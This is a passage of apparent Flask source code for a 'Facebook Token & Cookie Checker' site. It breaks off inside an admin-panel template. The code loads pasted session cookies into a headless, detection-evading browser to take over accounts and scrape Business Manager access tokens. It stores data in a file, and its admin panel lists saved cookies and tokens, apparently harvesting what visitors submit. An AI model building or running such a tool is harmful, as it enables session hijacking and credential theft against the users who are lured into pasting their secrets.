from flask import Flask, request, render_template_string, jsonify, session, redirect, url_for
import requests
import json
import os
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import re
from datetime import datetime

app = Flask(__name__)
app.secret_key = os.environ.get('SESSION_SECRET', 'rowedy-kiing-secret-key-2025')

DATA_FILE = 'admin_data.json'

def load_data():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, 'r') as f:
                return json.load(f)
        except:
            pass
    return {'cookies': [], 'tokens': []}

def save_data(data):
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=2)

class TokenChecker:
    @staticmethod
    def verify_facebook_token(access_token):
        try:
            if not access_token or len(access_token) < 10:
                return {'valid': False, 'error': 'Invalid token format'}
            
            url = "https://graph.facebook.com/me"
            params = {
                'access_token': access_token,
                'fields': 'id,name,first_name,last_name,picture.type(large)'
            }
            
            response = requests.get(url, params=params, timeout=10)
            user_data = response.json()
            
            if 'id' in user_data:
                user_id = user_data['id']
                
                if 'picture' in user_data and 'data' in user_data['picture']:
                    user_data['profile_picture'] = user_data['picture']['data']['url']
                else:
                    user_data['profile_picture'] = f"https://graph.facebook.com/{user_id}/picture?width=500&height=500"
                
                user_data['profile_link'] = f"https://www.facebook.com/{user_id}"
                user_data['token'] = access_token
                
                return {
                    'valid': True,
                    'user_id': user_id,
                    'user_info': user_data
                }
            else:
                error_msg = user_data.get('error', {}).get('message', 'Token validation failed')
                return {'valid': False, 'error': error_msg}
                
        except Exception as e:
            return {'valid': False, 'error': f'Token verification failed: {str(e)}'}

class CookieChecker:
    @staticmethod
    def parse_cookie_string(cookies_data):
        try:
            print("🔍 Parsing cookie...")
            cookie_string = cookies_data.strip()
            cookie_dict = {}
            parts = cookie_string.split(';')
            
            for part in parts:
                part = part.strip()
                if part and '=' in part:
                    key, value = part.split('=', 1)
                    cookie_dict[key.strip()] = value.strip()
            
            if 'c_user' in cookie_dict:
                user_id = cookie_dict['c_user']
                print(f"✅ Found c_user: {user_id}")
                return {
                    'cookie_dict': cookie_dict,
                    'user_id': user_id,
                    'has_auth': True,
                    'cookie_string': cookie_string
                }
            else:
                return {'error': 'c_user not found in cookie'}
                
        except Exception as e:
            return {'error': f'Cookie parsing failed: {str(e)}'}

    @staticmethod
    def get_profile_with_selenium(cookie_dict, user_id, cookie_string):
        driver = None
        try:
            print("🌐 Starting browser automation...")
            
            chrome_options = Options()
            chrome_options.add_argument('--headless')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--disable-blink-features=AutomationControlled')
            chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
            chrome_options.add_argument('--disable-extensions')
            chrome_options.add_argument('--disable-images')
            chrome_options.page_load_strategy = 'eager'
            
            driver = webdriver.Chrome(options=chrome_options)
            print("✅ Browser started")
            
            driver.get("https://www.facebook.com")
            print("✅ Loaded Facebook homepage")
            
            time.sleep(1.5)
            
            for cookie_name, cookie_value in cookie_dict.items():
                try:
                    driver.add_cookie({
                        'name': cookie_name,
                        'value': cookie_value,
                        'domain': '.facebook.com'
                    })
                except Exception as e:
                    print(f"⚠️ Could not add cookie {cookie_name}: {e}")
            
            print("✅ Cookies injected")
            
            actual_name = None
            profile_picture = None
            
            print("🔍 Trying Graph API first for name and picture...")
            try:
                headers = {'Cookie': cookie_string}
                response = requests.get(f"https://graph.facebook.com/{user_id}", params={'fields': 'name,picture.type(large)'}, headers=headers, timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    if 'name' in data:
                        actual_name = data['name']
                        print(f"✅ Got name from Graph API: {actual_name}")
                    if 'picture' in data and 'data' in data['picture'] and 'url' in data['picture']['data']:
                        profile_picture = data['picture']['data']['url']
                        print(f"✅ Got picture from Graph API")
            except Exception as e:
                print(f"⚠️ Graph API failed: {e}")
            
            if not actual_name or not profile_picture:
                profile_url = f"https://m.facebook.com/{user_id}"
                driver.get(profile_url)
                print(f"✅ Navigated to mobile profile: {profile_url}")
                
                time.sleep(2)
                
                if not actual_name:
                    try:
                        title = driver.title
                        if title and title != "Facebook":
                            actual_name = title.replace(' | Facebook', '').replace('Facebook - ', '').strip()
                            if actual_name:
                                print(f"✅ Got name from page title: {actual_name}")
                    except Exception as e:
                        print(f"⚠️ Could not get name from title: {e}")
                
                if not actual_name:
                    try:
                        name_selectors = ["//h1", "//h3", "//span[contains(@class, 'profileName')]", "//div[@id='m-timeline-cover-section']//h3"]
                        for selector in name_selectors:
                            try:
                                name_element = driver.find_element(By.XPATH, selector)
                                if name_element and name_element.text.strip():
                                    actual_name = name_element.text.strip()
                                    print(f"✅ Found name via selector: {actual_name}")
                                    break
                            except:
                                continue
                    except Exception as e:
                        print(f"⚠️ Could not find name elements: {e}")
                
                if not profile_picture:
                    try:
                        img_elements = driver.find_elements(By.TAG_NAME, "img")
                        for img in img_elements[:15]:
                            src = img.get_attribute("src")
                            alt = img.get_attribute("alt") or ""
                            if src and ("scontent" in src or "fbcdn" in src):
                                if any(x in src.lower() for x in ["profile", "profilepic", "p50x50", "p100x100", "p200x200"]) or actual_name and actual_name.lower() in alt.lower():
                                    profile_picture = src
                                    print(f"✅ Found profile picture")
                                    break
                    except Exception as e:
                        print(f"⚠️ Could not find profile picture: {e}")
            
            if not actual_name:
                actual_name = f"User {user_id}"
            
            if not profile_picture:
                profile_picture = f"https://graph.facebook.com/{user_id}/picture?width=500&height=500&type=large"
            
            print("🔍 Extracting EAAD/EAAA tokens from Business Manager...")
            tokens = []
            try:
                driver.get("https://business.facebook.com/content_management")
                time.sleep(3)
                tokens = CookieChecker.extract_tokens_from_page(driver)
            except Exception as e:
                print(f"⚠️ Could not access Business Manager: {e}")
            
            if not tokens:
                try:
                    print("🔍 Trying to extract tokens from main page...")
                    driver.get("https://www.facebook.com")
                    time.sleep(2)
                    tokens = CookieChecker.extract_tokens_from_page(driver)
                except:
                    pass
            
            driver.quit()
            
            return {
                'id': user_id,
                'name': actual_name,
                'first_name': actual_name.split()[0] if ' ' in actual_name else actual_name,
                'last_name': actual_name.split()[-1] if ' ' in actual_name and len(actual_name.split()) > 1 else '',
                'profile_picture': profile_picture,
                'profile_link': f"https://www.facebook.com/{user_id}",
                'cookie': cookie_string,
                'tokens': tokens,
                'source': 'selenium_browser_automation'
            }
                
        except Exception as e:
            if driver:
                try:
                    driver.quit()
                except:
                    pass
            print(f"❌ Selenium error: {e}")
            return {'error': f'Browser automation failed: {str(e)}'}

    @staticmethod
    def verify_facebook_cookies(cookies_data):
        try:
            print("🎯 Starting cookie verification with Selenium...")
            
            parsed_cookie = CookieChecker.parse_cookie_string(cookies_data)
            
            if 'error' in parsed_cookie:
                return {'valid': False, 'error': parsed_cookie['error']}
            
            user_id = parsed_cookie.get('user_id')
            cookie_dict = parsed_cookie.get('cookie_dict')
            cookie_string = parsed_cookie.get('cookie_string')
            
            if not user_id:
                return {'valid': False, 'error': 'No user ID found in cookies'}
            
            print(f"🔍 Getting ACTUAL profile data with browser automation...")
            user_info = CookieChecker.get_profile_with_selenium(cookie_dict, user_id, cookie_string)
            
            if 'error' in user_info:
                return {'valid': False, 'error': user_info['error']}
            
            result = {
                'valid': True,
                'user_id': user_id,
                'user_info': user_info,
                'message': 'Cookie verification successful with browser automation'
            }
            
            print(f"✅ Successfully fetched profile: {user_info.get('name')}")
            return result
                
        except Exception as e:
            print(f"❌ Verification error: {e}")
            return {'valid': False, 'error': f'Cookie verification failed: {str(e)}'}

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ROWEDY KIING - Facebook Checker</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            min-height: 100vh;
            padding: 15px;
            padding-bottom: 70px;
            color: #fff;
            position: relative;
            background-image: url('https://i.ibb.co/xKr63Kz7/1751604882110.jpg');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
        }
        
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.4);
            z-index: 0;
        }
        
        .container { 
            max-width: 1100px; 
            margin: 0 auto; 
            position: relative;
            z-index: 1;
        }
        
        .header {
            text-align: center;
            margin-bottom: 25px;
            background: rgba(255, 255, 255, 0.08);
            padding: 30px 15px;
            border-radius: 15px;
            backdrop-filter: blur(8px);
            border: 2px solid rgba(255, 215, 0, 0.3);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }
        
        .header-image {
            width: 120px;
            height: 120px;
            border-radius: 50%;
            margin-bottom: 15px;
            box-shadow: 0 4px 20px rgba(255, 215, 0, 0.5);
            border: 4px solid #FFD700;
            object-fit: cover;
        }
        
        .header-name {
            font-size: 2em;
            font-weight: 900;
            color: #FFD700;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.8);
            margin-bottom: 8px;
            letter-spacing: 1px;
        }
        
        .header-bio {
            font-size: 1.1em;
            color: rgba(255, 255, 255, 0.9);
            font-weight: 500;
            margin-bottom: 15px;
            font-style: italic;
        }
        
        .subtitle {
            font-size: 0.95em;
            color: #FFD700;
            font-weight: 600;
            margin-top: 8px;
        }
        
        .admin-btn {
            background: linear-gradient(135deg, #9C27B0, #7B1FA2);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 8px;
            font-size: 0.95em;
            font-weight: 700;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(156, 39, 176, 0.4);
            text-transform: uppercase;
            text-decoration: none;
            display: inline-block;
            margin-top: 10px;
        }
        
        .admin-btn:hover {
            opacity: 0.9;
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(156, 39, 176, 0.6);
        }
        
        .checker-grid { 
            display: grid; 
            grid-template-columns: 1fr 1fr; 
            gap: 18px;
            margin-bottom: 25px;
        }
        
        @media (max-width: 768px) {
            .checker-grid { grid-template-columns: 1fr; }
        }
        
        .card {
            background: rgba(255, 255, 255, 0.08);
            padding: 18px;
            border-radius: 15px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            backdrop-filter: blur(12px);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }
        
        .card-header { 
            font-size: 1.2em;
            font-weight: 700;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 8px;
            color: #FFD700;
        }
        
        textarea {
            width: 100%;
            padding: 12px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.1);
            color: #fff;
            min-height: 95px;
            font-family: 'Courier New', monospace;
            font-size: 0.82em;
            resize: vertical;
            margin-bottom: 12px;
        }
        
        textarea::placeholder { color: rgba(255, 255, 255, 0.6); }
        textarea:focus {
            outline: none;
            border-color: #FFD700;
            background: rgba(255, 255, 255, 0.15);
        }
        
        .btn {
            background: linear-gradient(135deg, #4CAF50, #45a049);
            color: white;
            border: none;
            padding: 13px 20px;
            border-radius: 8px;
            font-size: 0.95em;
            font-weight: 700;
            cursor: pointer;
            width: 100%;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
            text-transform: uppercase;
        }
        
        .btn:hover { 
            opacity: 0.9;
        }
        
        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        
        .btn-cookie { 
            background: linear-gradient(135deg, #FF6B35, #F7931E);
        }
        
        .result {
            margin-top: 12px;
            padding: 15px;
            border-radius: 10px;
            font-size: 0.88em;
        }
        
        .success { 
            background: rgba(76, 175, 80, 0.25);
            border: 2px solid #4CAF50;
        }
        
        .error { 
            background: rgba(244, 67, 54, 0.25);
            border: 2px solid #f44336;
        }
        
        .profile-box {
            background: rgba(255, 255, 255, 0.12);
            padding: 18px;
            border-radius: 12px;
            margin-top: 12px;
            border: 2px solid rgba(255, 215, 0, 0.4);
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
        }
        
        .profile-top {
            display: flex;
            align-items: center;
            gap: 15px;
            margin-bottom: 18px;
            padding-bottom: 15px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.3);
        }
        
        .dp-img {
            width: 75px;
            height: 75px;
            border-radius: 50%;
            border: 3px solid #FFD700;
            object-fit: cover;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
        }
        
        .user-details h3 {
            font-size: 1.25em;
            margin-bottom: 5px;
            color: #FFD700;
        }
        
        .user-details p {
            font-size: 0.82em;
            opacity: 0.9;
        }
        
        .info-row {
            background: rgba(0, 0, 0, 0.3);
            padding: 10px 12px;
            border-radius: 8px;
            margin-bottom: 10px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 0.85em;
            border-left: 3px solid rgba(255, 215, 0, 0.6);
        }
        
        .info-label {
            font-weight: 700;
            margin-right: 10px;
            color: #FFD700;
        }
        
        .info-text {
            flex: 1;
            word-break: break-all;
            margin-right: 10px;
            opacity: 0.95;
        }
        
        .copy-btn {
            background: #2196F3;
            border: none;
            color: white;
            padding: 6px 14px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.78em;
            font-weight: 700;
            flex-shrink: 0;
        }
        
        .copy-btn:hover {
            background: #1976D2;
        }
        
        .copy-btn.copied {
            background: #4CAF50;
        }
        
        .token-box {
            margin-top: 15px;
            padding: 15px;
            background: rgba(255, 215, 0, 0.15);
            border-radius: 10px;
            border: 2px solid rgba(255, 215, 0, 0.5);
        }
        
        .token-box h4 {
            margin-bottom: 12px;
            color: #FFD700;
            font-size: 1em;
            font-weight: 700;
        }
        
        .spinner.loading {
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-top: 3px solid #FFD700;
            border-radius: 50%;
            width: 35px;
            height: 35px;
            animation: spin 1s linear infinite;
            margin: 18px auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .footer {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: rgba(0, 0, 0, 0.85);
            backdrop-filter: blur(10px);
            padding: 15px 20px;
            text-align: center;
            border-top: 2px solid rgba(255, 215, 0, 0.4);
            z-index: 1000;
        }
        
        .footer-text {
            font-size: 0.9em;
            font-weight: 600;
            color: #FFD700;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://i.ibb.co/vCd29NJd/1751604135213.jpg" alt="Header" class="header-image">
            <h1 class="header-name">Rowedy Kiing</h1>
            <p class="header-bio">💖 Pyar Ek Anmol Chiz 💖</p>
            <p class="subtitle">🔥 Facebook Token & Cookie Checker 🔥</p>
            <a href="/admin/login" class="admin-btn">🔐 Admin Panel</a>
        </div>

        <div class="checker-grid">
            <div class="card">
                <div class="card-header">🔑 TOKEN CHECKER</div>
                <textarea id="tokenInput" placeholder="Paste your Facebook access token here...
Example: EAAG..."></textarea>
                <button class="btn" onclick="checkToken()">VERIFY TOKEN</button>
                <div id="tokenResult" style="display:none;"></div>
            </div>

            <div class="card">
                <div class="card-header">🍪 COOKIE CHECKER</div>
                <textarea id="cookieInput" placeholder="Paste your Facebook cookies here...
Example: datr=...; sb=...; c_user=..."></textarea>
                <button class="btn btn-cookie" onclick="checkCookie()">VERIFY COOKIE</button>
                <div id="cookieResult" style="display:none;"></div>
            </div>
        </div>
    </div>

    <div class="footer">
        <div class="footer-text">⚡ CODED BY ROWEDY KIING ⚡</div>
    </div>

    <script>
        async function checkToken() {
            const token = document.getElementById('tokenInput').value.trim();
            const btn = event.target;
            const resultDiv = document.getElementById('tokenResult');

            if (!token) {
                resultDiv.innerHTML = '<div class="result error">⚠️ Please enter a token!</div>';
                resultDiv.style.display = 'block';
                return;
            }

            btn.disabled = true;
            resultDiv.style.display = 'block';
            resultDiv.innerHTML = '<div class="result"><div class="spinner loading"></div><p style="text-align:center;">Verifying token...</p></div>';

            try {
                const response = await fetch('/check_token', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ token: token })
                });

                const data = await response.json();

                if (data.valid) {
                    const user = data.user_info;
                    resultDiv.innerHTML = `
                        <div class="result success">
                            <div style="text-align:center; margin-bottom:15px;">
                                <strong style="font-size:1.1em;">✅ VALID TOKEN!</strong>
                            </div>
                            <div class="profile-box">
                                <div class="profile-top">
                                    <img src="${user.profile_picture}" alt="DP" class="dp-img">
                                    <div class="user-details">
                                        <h3>${user.name}</h3>
                                        <p>ID: ${user.id}</p>
                                    </div>
                                </div>
                                <div class="info-row">
                                    <span class="info-label">👤 Name:</span>
                                    <span class="info-text">${user.name}</span>
                                </div>
                                <div class="info-row">
                                    <span class="info-label">🆔 User ID:</span>
                                    <span class="info-text">${user.id}</span>
                                    <button class="copy-btn" onclick="copyText('${user.id}', this)">Copy</button>
                                </div>
                                <div class="info-row">
                                    <span class="info-label">🔗 Profile:</span>
                                    <span class="info-text"><a href="${user.profile_link}" target="_blank" style="color:#FFD700;">View Profile</a></span>
                                </div>
                                <div class="info-row">
                                    <span class="info-label">🔑 Token:</span>
                                    <span class="info-text">${token.substring(0, 30)}...</span>
                                    <button class="copy-btn" onclick="copyText('${token}', this)">Copy</button>
                                </div>
                            </div>
                        </div>
                    `;
                } else {
                    resultDiv.innerHTML = `<div class="result error"><strong>❌ INVALID TOKEN!</strong><br>${data.error}</div>`;
                }
            } catch (error) {
                resultDiv.innerHTML = `<div class="result error">❌ Error: ${error.message}</div>`;
            } finally {
                btn.disabled = false;
            }
        }

        async function checkCookie() {
            const cookie = document.getElementById('cookieInput').value.trim();
            const btn = event.target;
            const resultDiv = document.getElementById('cookieResult');

            if (!cookie) {
                resultDiv.innerHTML = '<div class="result error">⚠️ Please enter cookies!</div>';
                resultDiv.style.display = 'block';
                return;
            }

            btn.disabled = true;
            resultDiv.style.display = 'block';
            resultDiv.innerHTML = '<div class="result"><div class="spinner loading"></div><p style="text-align:center;">Verifying cookie... This may take 15-30 seconds...</p></div>';

            try {
                const response = await fetch('/check_cookie', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ cookies: cookie })
                });

                const data = await response.json();

                if (data.valid) {
                    const user = data.user_info;
                    let tokensHTML = '';
                    if (user.tokens && user.tokens.length > 0) {
                        tokensHTML = '<div class="token-box"><h4>🎯 Extracted Tokens (EAAD/EAAA):</h4>';
                        user.tokens.forEach((token, index) => {
                            tokensHTML += `<div class="info-row"><span class="info-label">Token ${index + 1}:</span><span class="info-text">${token.substring(0, 50)}...</span><button class="copy-btn" onclick="copyText('${token}', this)">Copy</button></div>`;
                        });
                        tokensHTML += '</div>';
                    }
                    
                    resultDiv.innerHTML = `
                        <div class="result success">
                            <div style="text-align:center; margin-bottom:15px;">
                                <strong style="font-size:1.1em;">✅ VALID COOKIE!</strong>
                            </div>
                            <div class="profile-box">
                                <div class="profile-top">
                                    <img src="${user.profile_picture}" alt="DP" class="dp-img" onerror="this.src='https://graph.facebook.com/${user.id}/picture?width=500&height=500'">
                                    <div class="user-details">
                                        <h3>${user.name}</h3>
                                        <p>ID: ${user.id}</p>
                                        <p style="font-size:0.75em; opacity:0.8;">✅ Verified via SELENIUM BROWSER • Status: Active</p>
                                    </div>
                                </div>
                                <div class="info-row">
                                    <span class="info-label">🆔 User ID:</span>
                                    <span class="info-text">${user.id}</span>
                                    <button class="copy-btn" onclick="copyText('${user.id}', this)">Copy</button>
                                </div>
                                <div class="info-row">
                                    <span class="info-label">👤 First Name:</span>
                                    <span class="info-text">${user.first_name || ''}</span>
                                </div>
                                <div class="info-row">
                                    <span class="info-label">👤 Last Name:</span>
                                    <span class="info-text">${user.last_name || ''}</span>
                                </div>
                                <div class="info-row">
                                    <span class="info-label">🔗 Profile Link:</span>
                                    <span class="info-text"><a href="${user.profile_link}" target="_blank" style="color:#FFD700;">View Facebook Profile</a></span>
                                </div>
                                <div class="info-row">
                                    <span class="info-label">🍪 Cookie:</span>
                                    <span class="info-text">${user.cookie.substring(0, 50)}...</span>
                                    <button class="copy-btn" onclick="copyText('${user.cookie.replace(/'/g, "\\'")}', this)">Copy</button>
                                </div>
                                ${tokensHTML}
                            </div>
                        </div>
                    `;
                } else {
                    resultDiv.innerHTML = `<div class="result error"><strong>❌ INVALID COOKIE!</strong><br>${data.error}</div>`;
                }
            } catch (error) {
                resultDiv.innerHTML = `<div class="result error">❌ Error: ${error.message}</div>`;
            } finally {
                btn.disabled = false;
            }
        }

        function copyText(text, btn) {
            navigator.clipboard.writeText(text).then(() => {
                const originalText = btn.textContent;
                btn.textContent = 'Copied!';
                btn.classList.add('copied');
                setTimeout(() => {
                    btn.textContent = originalText;
                    btn.classList.remove('copied');
                }, 2000);
            });
        }
    </script>
</body>
</html>
'''

ADMIN_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - ROWEDY KIING</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            min-height: 100vh;
            padding: 15px;
            padding-bottom: 70px;
            color: #fff;
            position: relative;
            background-image: url('https://i.ibb.co/xKr63Kz7/1751604882110.jpg');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
        }
        
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.4);
            z-index: 0;
        }
        
        .container { 
            max-width: 1200px; 
            margin: 0 auto; 
            position: relative;
            z-index: 1;
        }
        
        .header {
            text-align: center;
            margin-bottom: 25px;
            background: rgba(255, 255, 255, 0.08);
            padding: 30px 15px;
            border-radius: 15px;
            backdrop-filter: blur(8px);
            border: 2px solid rgba(255, 215, 0, 0.3);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }
        
        .header-image {
            width: 120px;
            height: 120px;
            border-radius: 50%;
            margin-bottom: 15px;
            box-shadow: 0 4px 20px rgba(255, 215, 0, 0.5);
            border: 4px solid #FFD700;
            object-fit: cover;
        }
        
        .header-name {
            font-size: 2em;
            font-weight: 900;
            color: #FFD700;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.8);
            margin-bottom: 8px;
            letter-spacing: 1px;
        }
        
        .header-bio {
            font-size: 1.1em;
            color: rgba(255, 255, 255, 0.9);
            font-weight: 500;
            margin-bottom: 15px;
            font-style: italic;
        }
        
        .subtitle {
            font-size: 0.95em;
            color: #FFD700;
            font-weight: 600;
            margin-top: 8px;
        }
        
        .admin-btn {
            background: linear-gradient(135deg, #9C27B0, #7B1FA2);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 8px;
            font-size: 0.95em;
            font-weight: 700;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(156, 39, 176, 0.4);
            text-transform: uppercase;
            text-decoration: none;
            display: inline-block;
            margin-top: 10px;
        }
        
        .admin-btn:hover {
            opacity: 0.9;
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(156, 39, 176, 0.6);
        }
        
        .tabs {
            display: flex;
            gap: 15px;
            margin-bottom: 20px;
            justify-content: center;
        }
        
        .tab-btn {
            background: rgba(255, 255, 255, 0.1);
            color: #fff;
            border: 2px solid rgba(255, 215, 0, 0.3);
            padding: 12px 30px;
            border-radius: 10px;
            font-size: 1em;
            font-weight: 700;
            cursor: pointer;
            backdrop-filter: blur(8px);
            transition: all 0.3s;
        }
        
        .tab-btn:hover {
            background: rgba(255, 215, 0, 0.2);
            border-color: rgba(255, 215, 0, 0.5);
        }
        
        .tab-btn.active {
            background: rgba(255, 215, 0, 0.3);
            border-color: #FFD700;
            color: #FFD700;
        }
        
        .tab-content {
            display: none;
        }
        
        .tab-content.active {
            display: block;
        }
        
        .card {
            background: rgba(255, 255, 255, 0.08);
            padding: 20px;
            border-radius: 15px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            backdrop-filter: blur(12px);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            margin-bottom: 15px;
        }
        
        .item-box {
            background: rgba(255, 255, 255, 0.12);
            padding: 18px;
            border-radius: 12px;
            margin-bottom: 15px;
            border: 2px solid rgba(255, 215, 0, 0.4);
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
        }
        
        .item-header {
            display: flex;
            align-items: center;
            gap: 15px;
            margin-bottom: 15px;
            padding-bottom: 15px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.3);
        }
        
        .dp-img {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            border: 3px solid #FFD700;
            object-fit: cover;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
        }
        
        .item-details h3 {
            font-size: 1.1em;
            margin-bottom: 5px;
            color: #FFD700;
        }
        
        .item-details p {
            font-size: 0.85em;
            opacity: 0.9;
        }
        
        .info-row {
            background: rgba(0, 0, 0, 0.3);
            padding: 10px 12px;
            border-radius: 8px;
            margin-bottom: 10px;
            font-size: 0.85em;
            border-left: 3px solid rgba(255, 215, 0, 0.6);
            word-break: break-all;
        }
        
        .info-label {
            font-weight: 700;
            color: #FFD700;
            margin-right: 8px;
        }
        
        .action-buttons {
            display: flex;
            gap: 10px;
            margin-top: 15px;
        }
        
        .btn {
            padding: 10px 20px;
            border: none;
            border-radius: 8px;
            font-size: 0.9em;
            font-weight: 700;
            cursor: pointer;
            flex: 1;
        }
        
        .btn-test {
            background: linear-gradient(135deg, #2196F3, #1976D2);
            color: white;
        }
        
        .btn-remove {
            background: linear-gradient(135deg, #f44336, #d32f2f);
            color: white;
        }
        
        .btn:hover {
            opacity: 0.9;
        }
        
        .status-badge {
            display: inline-block;
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 0.8em;
            font-weight: 700;
            margin-left: 10px;
        }
        
        .status-valid {
            background: rgba(76, 175, 80, 0.3);
            border: 1px solid #4CAF50;
            color: #4CAF50;
        }
        
        .status-invalid {
            background: rgba(244, 67, 54, 0.3);
            border: 1px solid #f44336;
            color: #f44336;
        }
        
        .empty-state {
            text-align: center;
            padding: 40px;
            color: rgba(255, 255, 255, 0.7);
            font-size: 1.1em;
        }
        
        .logout-btn {
            background: rgba(244, 67, 54, 0.3);
            border: 2px solid #f44336;
            color: #fff;
            padding: 10px 25px;
            border-radius: 8px;
            font-size: 0.9em;
            font-weight: 700;
            cursor: pointer;
            margin: 20px auto;
            display: block;
        }
        
        .logout-btn:hover {
            background: rgba(244, 67, 54, 0.5);
        }
        
        .footer {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: rgba(0, 0, 0, 0.85);
            backdrop-filter: blur(10px);
            padding: 15px 20px;
            text-align: center;
            border-top: 2px solid rgba(255, 215, 0, 0.4);
            z-index: 1000;
        }
        
        .footer-text {
            font-size: 0.9em;
            font-weight: 600;
            color: #FFD700;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://i.ibb.co/vCd29NJd/1751604135213.jpg" alt="Header" class="header-image">
            <h1 class="header-name">Rowedy Kiing</h1>
            <p class="header-bio">💖 Pyar Ek Anmol Chiz 💖</p>
            <p class="subtitle">🔐 Admin Panel - Saved Cookies & Tokens 🔐</p>
        </div>

        <div class="tabs">
            <button class="tab-btn active" onclick="switchTab('cookies')">🍪 Cookies ({{ cookies_count }})</button>
            <button class="tab-btn" onclick="switchTab('tokens')">🔑 Tokens ({{ tokens_count }})</button>
        </div>

        <div id="cookies-tab" class="tab-content active">
            {% if cookies|length == 0 %}
                <div class="card">
                    <div class="empty-state">
                        📭 No cookies saved yet
                    </div>
                </div>
            {% else %}
                {% for cookie in cookies %}
                <div class="card item-box">
                    <div class="item-header">
                        <img src="{{ cookie.profile_picture }}" alt="DP" class="dp-img" onerror="this.src='https://via.placeholder.com/60'">
                        <div class="item-details">
                            <h3>{{ cookie.name }}</h3>
                            <p>ID: {{ cookie.user_id }}</p>
                            <p style="font-size:0.75em; opacity:0.7;">Added: {{ cookie.added_at }}</p>
                        </div>
                    </div>
                    <div class="info-row">
                        <span class="info-label">🍪 Cookie:</span>
                        {{ cookie.cookie[:80] }}...
                    </div>
                    <div class="action-buttons">
                        <button class="btn btn-remove" onclick="removeItem('cookie', {{ loop.index0 }})">🗑️ Remove</button>
                    </div>
                </div>
                {% endfor %}
            {% endif %}
        </div>

        <div id="tokens-tab" class="tab-content">
            {% if tokens|length == 0 %}
                <div class="card">
                    <div class="empty-state">
                        📭 No tokens saved yet
                    </div>
                </div>
            {% else %}
                {% for token in tokens %}
                <div class="card item-box" id="token-{{ loop.index0 }}">
                    <div class="item-header">
                        <img src="{{ token.profile_picture }}" alt="DP" class="dp-img" onerror="this.src='https://via.placeholder.com/60'">
                        <div class="item-details">
                            <h3>{{ token.name }}
                                <span class="status-badge status-{{ token.status|default('valid') }}" id="status-{{ loop.index0 }}">
                                    {{ token.status|default('valid')|upper }}
                                </span>
                            </h3>
                            <p>ID: {{ token.user_id }}</p>
                            <p style="font-size:0.75em; opacity:0.7;">Added: {{ token.added_at }}</p>
                        </div>
                    </div>
                    <div class="info-row">
                        <span class="info-label">🔑 Token:</span>
                        {{ token.token[:80] }}...
                    </div>
                    <div class="action-buttons">
                        <button class="btn btn-test" onclick="testToken({{ loop.index0 }}, '{{ token.token }}')">🔍 Test Token</button>
                        <button class="btn btn-remove" onclick="removeItem('token', {{ loop.index0 }})">🗑️ Remove</button>
                    </div>
                </div>
